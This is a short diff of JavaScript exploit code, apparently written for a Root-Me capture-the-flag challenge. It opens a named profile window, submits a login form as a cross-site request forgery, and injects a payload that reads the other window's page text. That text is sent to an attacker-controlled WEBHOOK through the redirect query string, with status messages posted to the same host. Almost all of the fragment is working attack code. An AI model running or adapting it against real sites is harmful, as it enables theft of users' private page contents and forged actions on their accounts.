@@ -25,7 +25,6 @@ function imgEnd() {
 
 try {
   window.open(PROFILE, "rootme");
-  post(WEBHOOK, "opened");
 
   const payload = `
 const profile = window.open("", "rootme");
@@ -35,7 +34,7 @@ window.location = "${WEBHOOK}?" + profile.document.body.innerText;
   document.getElementById("login").submit();
   post(WEBHOOK, "csrfed");
 
-  setTimeout(() => (window.location = PROFILE), 4000);
+  setTimeout(() => imgEnd(), 4000);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
